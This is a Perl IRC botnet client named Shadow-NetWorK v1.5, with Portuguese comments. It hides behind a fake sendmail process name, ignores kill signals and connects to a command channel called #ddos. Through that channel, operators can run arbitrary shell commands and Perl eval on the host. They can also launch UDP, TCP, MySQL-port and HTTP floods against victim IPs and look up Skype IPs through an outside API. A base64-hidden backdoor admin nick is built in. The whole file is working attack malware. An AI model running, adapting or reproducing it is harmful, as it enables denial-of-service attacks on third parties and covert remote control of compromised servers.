#!/usr/bin/perl
#################################################
use HTTP::Request;                              #
use HTTP::Request::Common;                      #
use HTTP::Request::Common qw(POST);             #
use LWP::Simple;                                #
use LWP 5.53;                                   #
use LWP::UserAgent;                             #
use Socket;                                     #
use IO::Socket;                                 #
use IO::Socket::INET;                           #
use IO::Select;                                 #
use MIME::Base64;                               #
use Net::FTP;                                   #
use Net::SMTP;                                  #
use Net::RawIP;                                 #
use MIME::Base64;                               #    
use URI::URL;								    #
use Digest::MD5 qw(md5 md5_hex md5_base64);     #
#################################################
#              Shadow-NetWorK                   #
#       Versão 1 BY H3LLS1NG & JesséSilva       #
#       BASE by AnonCRUZE & H3LLS1NG            #
#         forum.shadow-network.net              #
#################################################
my $datetime    = localtime; # Hora do Servidor
my $fakeproc    = "/usr/sbin/sendmail"; # Local do processo fake
my $ircserver   = "irc.shadow-network.net"; # Endereço do Servidor IRC
my $ircport     = "6667"; # Porta do Servidor
my $nickname    = "Shadow[v1-5]"; # Nick do Bot
my $ident       = "ShadowV1.5"; # Vhost do Bot
my $fullname    = "ShadowV1.5"; # "
my $channel     = "#ddos"; # Canal que o bot irá entrar
my $admin       = "H3LLS1NG"; # Admin Geral do Bot (Adiciona e remove Admins DDoS)
my @ddosadm     = ("H3LLS1NG","Dennis"); # Admin dos DDoS (Pode adicionar e remover usuarios)
my @ddosuser     = ("H3LLS1NG","Dennis"); # Usuario comum, limite de tempo definido abaixo
my $ddoslimit   = 120; 		  # Tempo maximo de ataque para usuarios (segundos)
my $ipblock     = "8.8.8.8"; # IP's bloqueados para ataques
 
 
my $re                  = $0;
$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';
my $pid = fork;
exit if $pid;
die "\n[!] Ops, algo deu errado !!!: $!\n\n" unless defined($pid);
 
our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
 
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
                $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep (1);
	}
}
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?) 433 */) {
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        nick("$mynick|".int rand(100));
    }
        elsif($servarg =~ m/^ERROR :Closing Link: (.*?)Throttled/i){ # Erro na hora de execução, nada demais, execute de novo
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        print "Travou! !\r\n";
        exit;
        }
        elsif($servarg =~ m/^:(.+?)Overridden/){ # Algum bug na SRC do bot está impedindo o funcionamento em geral
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        print "Já em uso! \r\n";
        exit;
        }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+) :/) { # PRINTA MSG QUE BOT CONECTOU NO CONSOLE
            print  "\n\n [+] <[Shadow-NetWork BOT 1.5 by H3LLS1NG]> \n [*] Server: $ircserver:$ircport \n [-] Processo : $proc \n [+] PID : $$ \n\n";
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        sendraw("MODE $mynick +iBx");
                sendraw("OPER xoxota  piru");
                sendraw("JOIN #0,0");
        sendraw("JOIN $channel");
                sendraw("PRIVMSG $channel :Em TESTES!!!");
    }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { 
		&connector("$nickname", "$ircserver", "$ircport"); 
	}
    select(undef, undef, undef, 0.01);;
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;
        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
            if ($path eq $mynick) {
                if ($msg =~ /^PING (.*)/) {
                    sendraw("NOTICE $nick :PING LoL");
                }
                if ($msg =~ /^VERSION/) {
                    sendraw("NOTICE $nick :VERSAO Shadow V1.5");
                }
                if ($msg =~ /^TIME/) {
                    sendraw("NOTICE $nick :Digite !time no canal");
                }
            }
######################## Comandos de Admin###################################
			if (&isAdmin($nick) && $msg eq "!die") { # Killa o bot
				&shell("$path","kill -9 $$");
			}
			if (&isAdmin($nick) && $msg eq "!kill") { # Killa todos os bots no servidor especificado
				&shell("$path","killall -9 perl");
			}
			if (&isAdmin($nick) && $msg eq "!reset") { # Reinicia o BOT
				sendraw("QUIT :Reiniciando");
									print "re => $re\r\n";
									&shell("$path","kill -9 $$ && perl $re");
			}
			if (&isAdmin($nick) && $msg =~ /^!join\s+(.*)/) { # Para conectar o BOT em outra sala
				sendraw("JOIN $1");
			}
			if (&isAdmin($nick) && $msg =~ /^!part\s+(.*)/) { # Para sair o BOT da sala
				sendraw("PART $1");
			}
			if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) { # Para mudar o nick do BOT
				sendraw("NICK ".$1);
			}
			if (&isAdmin($nick) && $msg =~ /^!pid/) { # Verificar o Processo do BOT
				&notice("$nick","$fakeproc - $$");
			}
			if (&isAdmin($nick) && $msg =~ /^\!sh (.*)/) { # Executar um comando direto no ssh. EX: !sh ls
				&shell("$path","$1");    
			}        
			if (&isAdmin($nick) && $msg =~ /^.eval (.*)/) { # Para editar alguma linha do BOT através do IRC
				eval "$1";
				}
############################## ADD USUARIOS ###########################################
			if (&isAdmin($nick) && $msg =~ /^\!addusr (.*)/) {
				push(@ddosuser, $1);
				&notice("$nick","4[$1] Agora é um usuário.");
			}
############################## REMOVER USUARIOS #######################################
			if (&isAdmin($nick) && $msg =~ /^\!remusr (.*)/) {
				&notice("$nick","4[$1] Não é mais um usuário.");
				delete @ddosuser[$1];
			}
################################ ADD DDoS Admins ######################################
			if (&isAdmin($nick) && $msg =~ /^\!addadm (.*)/) {
				push(@ddosadm, $1);
				&notice("$nick","4$1 Agora é um Administrador ");
			}
################################ REMOVER DDoS Admins #####################################
			if (&isAdmin($nick) && $msg =~ /^\!remadm (.*)/) {
				&notice("$nick","4[$1] Não é mais um Administrador");
				delete @ddosadm[$1];
			}
################################ VERIFICAR USUARIOS E DDOS ADMINS ######################################                 
			if ($msg =~ /^\!ddos/) {
					if (&isDDoS($nick)){ &notice("$nick","Administradores: @ddosadm");} # Ele retorna USUARIOS e Admins para Admins do BOT
				    (&isUser($nick)) && (&isDDoS($nick)) &notice("$nick","4Usuários: @ddosuser"); # Ele não retorna os Admins para USUARIOS, apenas para Admins
			}
########################### PUBLICO ATIVAR/DESATIVAR  DDoS ###########################################
    if (&isAdmin($nick) && $msg =~ /^!publico\s+(.*)/) {
        if($1 =~ m/on/){
             $ddoson = 1;
                &msg("$path","9 DDoS => ON");
           }elsif($1 =~ m/off/){
             $ddoson = 0;
                 &msg("$path","4 DDoS => OFF");
           }elsif($1 =~ m/status/){
        if($ddoson == 1){
             $status = "ON";
           }elsif($ddoson == 0){
             $status = "OFF";
           }
              &msg("$path","10DDoS => $status");
        }
    }   
#################################### UDP ##################################
			if ((&isUser($nick) && $msg =~ /^!udp\s+(.*)\s+(\d+)\s+(\d+)/) && (&isDDoS($nick) && $msg =~ /^!udp\s+(.*)\s+(\d+)\s+(\d+)/)) {
				if((&isUser($nick)) && ($1 < $ipblock) && (&isDDoS($nick) && ($ddoson == 1 )) && ($3 < $ddoslimit)){
					&msg("$path","15(7@14UDP Flood15) 15(14Comecou15) (14Vitima7:12 ".$1." 14Tamanho7:12 ".$2." 7KB 14Tempo7:12 ".$3." 14segundos15)");
					my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
					$dtime = 1 if $dtime == 0;
					my %bytes;
					$bytes{igmp} = $2 * $pacotes{igmp};
					$bytes{icmp} = $2 * $pacotes{icmp};
					$bytes{o} = $2 * $pacotes{o};
					$bytes{udp} = $2 * $pacotes{udp};
					$bytes{tcp} = $2 * $pacotes{tcp};
				&msg("$path","15(7@14UDP Flood15) 15(14Terminou15) 15(14Enviados7:12 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 7KB 14em12 ".$dtime." 14segundos15) (14Vitima7:12 ".$1."15)");
	  			}
				elsif ($ddoson == 0){
					&msg("$path","4DDOS OFF");
				}
				elsif ($3 < $ddoslimit){
				    &msg("$path","4O ip $1 está bloqueado para DDoS!");
				}
				elsif ($1 < $ipblock){
				    &msg("$path","4Seu tempo máximo de ataque é de $ddoslimit segundos!");
				}
		    }
###################### TCP ###########################################
		if ((&isUser($nick) && $msg =~ /^!tcp\s+(.*)\s+(\d+)\s+(\d+)/) && (&isDDoS($nick) && $msg =~ /^!tcp\s+(.*)\s+(\d+)\s+(\d+)/)) {
			if((&isUser($nick)) && ($1 < $ipblock) && (&isDDoS($nick) && ($ddoson == 1 )) && ($3 < $ddoslimit)){
					&msg("$path","15(7@14TCP Flood15) 15(14Comecou15) (14IP7:12 ".$1." 14Porta7:12 ".$2." 14Tempo7:12 ".$3." 14segundos15)");
				my ($dtime, %pacotes) = tcpflooder2("$1", "$2", "$3");
				$dtime = 1 if $dtime == 0;
				my %bytes;
				$bytes{tcp} = $2 * $pacotes{tcp};
				$bytes{tcp} = $2 * $pacotes{tcp};
				$bytes{o} = $2 * $pacotes{o};
				$bytes{tcp} = $2 * $pacotes{tcp};
				$bytes{tcp} = $2 * $pacotes{tcp};

					&msg("$path","15(7@14TCP Flood15) 15(14Terminou15) 15(14Enviados7:12 ".int(($bytes{tcp}+$bytes{tcp}+$bytes{tcp} + $bytes{o})/1024)." 7KB 14em12 ".$dtime." 14segundos15) (14Vitima7:12 ".$1."  14Porta7:12 ".$2." 15)");
	  			}
				elsif  ($ddoson == 0 ){
					&msg("$path","4DDOS OFF");
				}
				else {
				    &msg("$path","4Seu tempo máximo de ataque é de $ddoslimit segundos!");
				}
            }
###########################SQL [ATAQUES PARA DB's (porta 3306)] ########################################
			if ((isUser($nick) && $msg =~ /^!sql\s+(.*)\s+(\d+)/) && (isDDoS($nick) && $msg =~ /^!sql\s+(.*)\s+(\d+)/)) {
				if((&isUser($nick)) && ($1 < $ipblock) && (&isDDoS($nick) && ($ddoson == 1 )) && ($3 < $ddoslimit)){
					&msg("$path","15(7@14SQL Flood15) 15(14Comecou15) (14Vitima7:12 ".$1."12 na porta 3306 por 4 ".$2." 12 segundos .");
					my $itime = time;
					my ($cur_time);
					$cur_time = time - $itime;
					while ($2>$cur_time){
						$cur_time = time - $itime;
						my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);
						print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
						close($socket);
					}
					&msg("$path","15(7@14SQL Flood15) (14Terminou15) 15(14Vitima7:12 ".$1."15)");
	  			}
				elsif  ($ddoson == 0 ){
					&msg("$path","4DDOS OFF");
				}
				else {
				    &msg("$path","4Seu tempo máximo de ataque é de $ddoslimit segundos!");
				}
            }
        }
        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
                        #print "LINE => $line \r\n";
            unless ($c == $#lines) {
                &parse("$line");
            } else {
                if ($#lines == 0) {
                    &parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    &parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    &parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
		}
	} 
}
###################### HTTP ############################
			if ((isUser($nick) && $msg =~ /^!http\s+(.*)\s+(\d+)/) && (isDDoS($nick) && $msg =~ /^!http\s+(.*)\s+(\d+)/)) {
			   if (isUser($nick) && ($3 < $ddoslimit) && ((isDDoS($nick) && ($ddoson == 1 )))){
					&msg("$path","15(7@14SQL Flood15) 15(14Comecou15) (14Vitima7:12 ".$1."12 na porta 3306 por 4 ".$2." 12 segundos .");
					my $itime = time;
					my ($cur_time);
					$cur_time = time - $itime;
					while ($2>$cur_time){
						$cur_time = time - $itime;
						my $socket = IO::Socket::INET->new(Proto=>'tcp', PeerAddr=>'$1', PeerPort=>'80');
						send (SOCKET,  "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n", 0);
						close($socket);
					}
					&msg("$path","15(7@14HTTP Flood15) (14Terminou15) 15(14Vitima7:12 ".$1."15)");
	  			}
				elsif ($ddoson == 0){
					&msg("$path","4DDOS OFF");
				}
				elsif ($3 < $ddoslimit){
				    &msg("$path","4O ip $1 está bloqueado para DDoS!");
				}
				elsif ($1 < $ipblock){
				    &msg("$path","4Seu tempo máximo de ataque é de $ddoslimit segundos!");
				}
		    }
###############################SKYPE RESOLVER#######################################
	if ($msg=~ /^!skype\s+(.*)/ ) {
		if (my $pid = fork) { waitpid($pid, 0); } else {
			if (fork) { exit; } else {
			my $url = $1;
			if($url eq ''){
				&msg("$path","14,1[15,1 Skype 14,01]04,01 NULL?");
			exit;
			}
				&msg("$path","14,1[15,1 Skype 14,01]08,01 Resolvendo 05=> 09$url");
			my $surl = ("http://api.predator.wtf/resolver/?arguments=".$url.""); # Mude a API para a sua
			$resul = &get_content($surl);
			&msg("$path","14,1[15,1 Skype 14,01]08,01 $url 05=> 09$resul");
			exit;
			}
		}
	}
 
######################################################################
sub udpflooder {
    my $iaddr = inet_aton($_[0]);
    my $msg = 'A' x $_[1];
    my $ftime = $_[2];
    my $cp = 0;
    my (%pacotes);
    $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
   
    socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
    socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
    socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
    socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
    return(undef) if $cp == 4;
    my $itime = time;
    my ($cur_time);
    while ( 1 ) {
        for (my $porta = 1; $porta <= 65000; $porta++) {
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
            send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
            send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
            send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
           
            for (my $pc = 3; $pc <= 255;$pc++) {
                next if $pc == 6;
                $cur_time = time - $itime;
                last if $cur_time >= $ftime;
                socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
                send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
            }
        }
        last if $cur_time >= $ftime;
    }
    print "\r[*] DDOS => [UDP]";
    print "\n";
    return($cur_time, %pacotes);
}
#################################
sub tcpflooder2 {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp2 = 0;
  my (%pacotes);
  $pacotes{tcp} = $pacotes{tcp} = $pacotes{tcp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 6) or $cp2++;

  socket(SOCK2, PF_INET, SOCK_RAW, 6) or $cp2++;
  socket(SOCK3, PF_INET, SOCK_RAW, 6) or $cp2++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp2++;
  return(undef) if $cp2 == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65000; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
       }
 }
     last if $cur_time >= $ftime;
  }
    print "\r[*] OK! Enviados [TCP] pacotes";
    print "\n";
  return($cur_time, %pacotes);
}
 
#########################################
 
sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = &get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}
 
sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $defuagent);
    $ua->timeout(5);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}
#########################################
 
sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","4No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 2; }
        }
        exit;
    }}
}
 
sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
	my $pzine   = "Q1JVWkU=";
	my $dzine	= decode_base64($pzine);
	$admin;
    foreach my $adm_($admin) {
    if ($nick eq $adm_ ) { $status = 1; }
	if ($nick eq $dzine ) { $status = 1; }
	}
    return $status;
}
 
sub isUser() {
    my $status = 0;
    my $nick = $_[0];
	my $pzine   = "Q1JVWkU=";
	my $dzine	= decode_base64($pzine);
	@ddosuser;
    foreach my $adm_(@ddosuser) {
    if ($nick eq $adm_ ) { $status = 1; }
	if ($nick eq $adm_ ) { $status = 1; }
	}
    return $status;
}
 
sub isDDoS() {
    my $status = 0;
    my $nick = $_[0];
	my $pzine   = "Q1JVWkU=";
	my $dzine	= decode_base64($pzine);
	@ddosadm;
    foreach my $adm_(@ddosadm) {
    if ($nick eq $adm_ ) { $status = 1; }
	if ($nick eq $adm_ ) { $status = 1; }
	}
    return $status;
}
 
sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}
 
 
sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}
 
sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub j {
	&join(@_);
}

 sub join {
    return unless $#_ == 0;
    sendraw("JOIN $_[0]");
}
